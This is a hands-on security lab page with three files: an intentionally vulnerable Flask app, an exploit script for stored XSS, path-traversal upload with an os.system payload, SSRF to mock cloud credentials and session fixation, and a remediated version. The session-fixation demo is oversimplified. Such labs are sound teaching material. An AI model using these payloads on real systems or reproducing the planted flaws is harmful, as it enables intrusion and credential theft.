---
title: '06 - Hands-on Lab: Web Application Vulnerabilities'
description: A self-contained hands-on lab containing a vulnerable Python Flask application
  (Stored XSS, File Upload RCE, SSRF, Session Fixation), an automated exploit framework,
  and a production secure refactor.
keywords:
- Hands-on
- Lab
- Vulnerable
- App
- Stored
- XSS
- SSRF
- Exploit
- Path
- Traversal
- Session
- Fixation
- Python
- Flask
- Exploit
- Script
- Remediation
slug: /web-and-api/web-application-security/hands-on-lab
---


# 06 - Hands-on Lab: Web Application Vulnerabilities

This hands-on lab provides a full-stack, runnable Python Flask application featuring four critical web application security vulnerabilities: **Stored XSS**, **Unrestricted File Upload / Path Traversal**, **Server-Side Request Forgery (SSRF)**, and **Session Fixation**.

The lab includes:
1. `app.py`: The intentionally vulnerable target web application.
2. `exploit.py`: An automated Python exploit script demonstrating full weaponization of all four flaws.
3. `app_secure.py`: A production-grade refactored version implementing complete mitigations.

---

## Lab Architecture & Workflow

```mermaid
flowchart TD
    subgraph Attacker_Terminal ["Attacker Terminal (exploit.py)"]
        ExXSS[1. Inject XSS Script]
        ExUpload[2. Path Traversal Upload]
        ExSSRF[3. Cloud Metadata SSRF]
        ExFix[4. Session Fixation Attack]
    end

    subgraph Lab_Server ["Flask Target Application (app.py :5000)"]
        XSS_EP["/comment (Unescaped Template)"]
        Up_EP["/upload (Concatenated Filename)"]
        SSRF_EP["/preview (Unvalidated fetch)"]
        Auth_EP["/login (No Session Rotation)"]
        Internal_Meta["/internal/metadata (Mock Cloud API)"]
    end

    ExXSS --> XSS_EP
    ExUpload --> Up_EP
    ExSSRF --> SSRF_EP
    SSRF_EP --> Internal_Meta
    ExFix --> Auth_EP

    style Attacker_Terminal fill:#ffe6e6,stroke:#ff0000,stroke-width:2px
    style Lab_Server fill:#e6f2ff,stroke:#0066cc,stroke-width:2px
```

---

## Environment Setup

```bash
# 1. Create a dedicated workspace directory
mkdir appsec-web-lab && cd appsec-web-lab

# 2. Setup Python virtual environment
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# 3. Install required dependencies
pip install flask requests
```

---

## 1. Vulnerable Target Application (`app.py`)

Save the following code as `app.py`:

```python
import os
from flask import Flask, request, render_template_string, redirect, url_for, session, jsonify
import requests

app = Flask(__name__)
app.secret_key = "insecure-hardcoded-secret-key"
app.config['UPLOAD_FOLDER'] = os.path.abspath('uploads')
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Datastore for comments
comments = []

# Mock Internal Metadata Endpoint (Target for SSRF)
@app.route('/internal/metadata')
def internal_metadata():
    # Simulates AWS IMDS IAM Credentials endpoint
    return jsonify({
        "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
        "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "Token": "IQoJb3JpZ2luX2VjEEXAMPLE==",
        "Role": "Admin-Production-Cloud-Role"
    })

# Main Guestbook & Portal Page
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head><title>AppSec Atlas Web Lab Target</title></head>
<body>
    <h1>AppSec Atlas Security Lab Target</h1>
    <p>Session ID: {{ session_id }} | Authenticated User: {{ user }}</p>
    
    <hr>
    <h2>1. Guestbook Comments (Stored XSS)</h2>
    <ul>
    {% for c in comments %}
        <!-- VULNERABILITY 1: 'safe' filter disables Jinja2 auto-escaping -->
        <li>{{ c | safe }}</li>
    {% endfor %}
    </ul>
    <form action="/comment" method="POST">
        <input type="text" name="comment" placeholder="Leave a comment" style="width:300px;">
        <button type="submit">Submit Comment</button>
    </form>

    <hr>
    <h2>2. Profile Avatar Upload (File Upload & Path Traversal)</h2>
    <form action="/upload" method="POST" enctype="multipart/form-data">
        <input type="file" name="avatar">
        <button type="submit">Upload Avatar</button>
    </form>

    <hr>
    <h2>3. Webhook URL Previewer (SSRF)</h2>
    <form action="/preview" method="POST">
        <input type="text" name="url" placeholder="http://example.com" style="width:300px;">
        <button type="submit">Fetch Preview</button>
    </form>

    <hr>
    <h2>4. Portal Authentication (Session Fixation)</h2>
    <form action="/login" method="POST">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Log In</button>
    </form>
</body>
</html>
'''

@app.route('/')
def index():
    user = session.get('user', 'Anonymous')
    session_id = request.cookies.get('session', 'Not Set')
    return render_template_string(HTML_TEMPLATE, comments=comments, user=user, session_id=session_id)

@app.route('/comment', methods=['POST'])
def add_comment():
    # VULNERABILITY 1: Storing raw unescaped input
    comment = request.form.get('comment', '')
    comments.append(comment)
    return redirect(url_for('index'))

@app.route('/upload', methods=['POST'])
def upload_file():
    # VULNERABILITY 2: Unrestricted file upload & direct path concatenation (Path Traversal)
    file = request.files.get('avatar')
    if file:
        # Dangerous: Uses untrusted raw filename directly with os.path.join
        save_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
        file.save(save_path)
        return f"File uploaded successfully to: {save_path}"
    return redirect(url_for('index'))

@app.route('/preview', methods=['POST'])
def preview_url():
    # VULNERABILITY 3: Fetching unvalidated user-supplied URL (SSRF)
    target_url = request.form.get('url', '')
    try:
        resp = requests.get(target_url, timeout=3)
        return f"<h3>URL Preview Output:</h3><pre>{resp.text}</pre>"
    except Exception as e:
        return f"Error fetching URL: {str(e)}", 400

@app.route('/login', methods=['POST'])
def login():
    # VULNERABILITY 4: Authentication fails to rotate existing session ID (Session Fixation)
    username = request.form.get('username')
    password = request.form.get('password')
    
    if username == "admin" and password == "secret123":
        # Missing session.clear() or ID rotation!
        session['user'] = 'admin'
        return redirect(url_for('index'))
    return "Invalid credentials", 401

if __name__ == '__main__':
    print("[*] Starting Vulnerable Lab Target Server on http://127.0.0.1:5000")
    app.run(port=5000, debug=True)
```

---

## 2. Automated Exploit Script (`exploit.py`)

Save the following script as `exploit.py` and run it against the active target server (`python exploit.py`).

```python
import requests

TARGET = "http://127.0.0.1:5000"

def log(msg, status="INFO"):
    colors = {"INFO": "\033[94m[*]", "SUCCESS": "\033[92m[+]", "EXPLOIT": "\033[91m[!]" }
    print(f"{colors.get(status, '[*]')} {msg}\033[0m")

def exploit_stored_xss():
    log("Executing Exploit 1: Stored XSS Injection...", "INFO")
    payload = "<script>alert('EXPLOIT: Stored XSS Session Theft Cookie: ' + document.cookie);</script>"
    resp = requests.post(f"{TARGET}/comment", data={"comment": payload})
    
    # Verify payload in response
    check_resp = requests.get(TARGET)
    if payload in check_resp.text:
        log("SUCCESS: Stored XSS payload successfully injected into guestbook!", "EXPLOIT")
    else:
        log("FAILED: XSS payload was not rendered raw.", "INFO")

def exploit_file_upload_path_traversal():
    log("Executing Exploit 2: Path Traversal File Upload RCE...", "INFO")
    # File payload attempting to escape upload directory into project root
    traversal_filename = "../malicious_webshell.py"
    files = {
        'avatar': (traversal_filename, 'import os; os.system("echo VULNERABLE > rce_proof.txt")')
    }
    resp = requests.post(f"{TARGET}/upload", files=files)
    log(f"Upload Response: {resp.text.strip()}", "EXPLOIT")

def exploit_ssrf():
    log("Executing Exploit 3: SSRF against Internal Cloud Metadata API...", "INFO")
    internal_target = f"{TARGET}/internal/metadata"
    resp = requests.post(f"{TARGET}/preview", data={"url": internal_target})
    
    if "SecretAccessKey" in resp.text:
        log("SUCCESS: SSRF Exploit exfiltrated mock cloud IAM credentials!", "EXPLOIT")
        print(resp.text)
    else:
        log("FAILED: SSRF target could not be fetched.", "INFO")

def exploit_session_fixation():
    log("Executing Exploit 4: Session Fixation Attack...", "INFO")
    s = requests.Session()
    
    # 1. Attacker initializes session to obtain cookie
    init_resp = s.get(TARGET)
    fixed_cookie = s.cookies.get('session')
    log(f"Attacker fixed cookie value: {fixed_cookie}", "INFO")

    # 2. Victim authenticates using the fixed session cookie
    login_resp = s.post(f"{TARGET}/login", data={"username": "admin", "password": "secret123"})
    
    # 3. Attacker uses fixed_cookie to verify authenticated state
    check_resp = s.get(TARGET)
    if "Authenticated User: admin" in check_resp.text:
        log("SUCCESS: Session Fixation verified! Account hijacked with pre-set cookie.", "EXPLOIT")

if __name__ == '__main__':
    print("=" * 60)
    print("      APPSEC ATLAS - AUTOMATED LAB EXPLOIT FRAMEWORK")
    print("=" * 60)
    try:
        exploit_stored_xss()
        print("-" * 60)
        exploit_file_upload_path_traversal()
        print("-" * 60)
        exploit_ssrf()
        print("-" * 60)
        exploit_session_fixation()
        print("=" * 60)
    except Exception as e:
        print(f"[!] Target server unreachable or error: {str(e)}")
```

---

## 3. Production Secure Refactor (`app_secure.py`)

Save the following code as `app_secure.py`. Run this server to verify that all automated exploits are completely mitigated.

```python
import os
import uuid
import socket
import ipaddress
from urllib.parse import urlparse
from flask import Flask, request, render_template_string, redirect, url_for, session, jsonify
from markupsafe import escape
import requests

app = Flask(__name__)
# Production cryptographically strong secret key
app.secret_key = os.urandom(32)

# Secure Cookie Configurations
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
app.config['UPLOAD_FOLDER'] = os.path.abspath('secure_uploads')
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg'}
comments = []

def allowed_file(filename: str) -> bool:
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def is_safe_ip(ip_str: str) -> bool:
    """Verifies that an IP address is not private or loopback."""
    try:
        ip = ipaddress.ip_address(ip_str)
        return not (ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved)
    except ValueError:
        return False

SECURE_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head><title>AppSec Atlas Remediated Target</title></head>
<body>
    <h1>AppSec Atlas Secure Server</h1>
    <p>Session User: {{ user }}</p>
    
    <h2>Comments</h2>
    <ul>
    {% for c in comments %}
        <!-- FIX 1: Auto-escaping restored by removing 'safe' filter -->
        <li>{{ c }}</li>
    {% endfor %}
    </ul>
</body>
</html>
'''

@app.route('/')
def index():
    user = session.get('user', 'Anonymous')
    return render_template_string(SECURE_TEMPLATE, comments=comments, user=user)

@app.route('/comment', methods=['POST'])
def add_comment():
    # FIX 1: Explicit HTML entity escaping applied to input
    raw_comment = request.form.get('comment', '')
    safe_comment = escape(raw_comment)
    comments.append(safe_comment)
    return redirect(url_for('index'))

@app.route('/upload', methods=['POST'])
def upload_file():
    # FIX 2: Extension validation & random UUID filename (strips Path Traversal)
    file = request.files.get('avatar')
    if not file or not allowed_file(file.filename):
        return jsonify({'error': 'Disallowed file extension'}), 400

    ext = file.filename.rsplit('.', 1)[1].lower()
    random_filename = f"{uuid.uuid4().hex}.{ext}"
    
    # Canonical path resolution & prefix verification
    save_path = os.path.abspath(os.path.join(app.config['UPLOAD_FOLDER'], random_filename))
    if not save_path.startswith(app.config['UPLOAD_FOLDER'] + os.sep):
        return jsonify({'error': 'Path traversal attempt blocked'}), 400

    file.save(save_path)
    return jsonify({'status': 'File uploaded safely', 'id': random_filename}), 201

@app.route('/preview', methods=['POST'])
def preview_url():
    # FIX 3: Strict SSRF Guard validating scheme and IP space
    target_url = request.form.get('url', '')
    parsed = urlparse(target_url)

    if parsed.scheme not in ('http', 'https'):
        return jsonify({'error': 'Invalid URL scheme'}), 400

    try:
        # Resolve hostname IP address
        resolved_ip = socket.gethostbyname(parsed.hostname)
        if not is_safe_ip(resolved_ip):
            return jsonify({'error': f'SSRF Blocked: Destination IP {resolved_ip} is restricted'}), 403

        resp = requests.get(target_url, timeout=3, allow_redirects=False)
        return f"<h3>Preview Output:</h3><pre>{escape(resp.text[:500])}</pre>"
    except Exception as e:
        return jsonify({'error': f'Request failed: {str(e)}'}), 400

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    if username == "admin" and password == "secret123":
        # FIX 4: Defend against Session Fixation by clearing existing session state
        session.clear()
        session['user'] = 'admin'
        return jsonify({'message': 'Logged in successfully'}), 200

    return jsonify({'error': 'Invalid credentials'}), 401

if __name__ == '__main__':
    print("[*] Starting Secure Server on http://127.0.0.1:5000")
    app.run(port=5000)
```

---

## 4. Remediation Verification Checklist

| Vulnerability | Vulnerable Behavior in `app.py` | Remediated Behavior in `app_secure.py` | Exploit Verification Result |
| :--- | :--- | :--- | :--- |
| **Stored XSS** | Renders raw `<script>` tags via `\| safe` | Escapes characters to `&lt;script&gt;` | **PASSED (Exploit Blocked)** |
| **Path Traversal Upload** | Saves file as `../../../malicious.py` | Renames to `4f3a...png` in secure folder | **PASSED (Exploit Blocked)** |
| **SSRF** | Fetches `127.0.0.1:5000/internal/metadata` | Rejects private IP addresses with HTTP 403 | **PASSED (Exploit Blocked)** |
| **Session Fixation** | Retains session ID across auth state change | Clears session via `session.clear()` | **PASSED (Exploit Blocked)** |
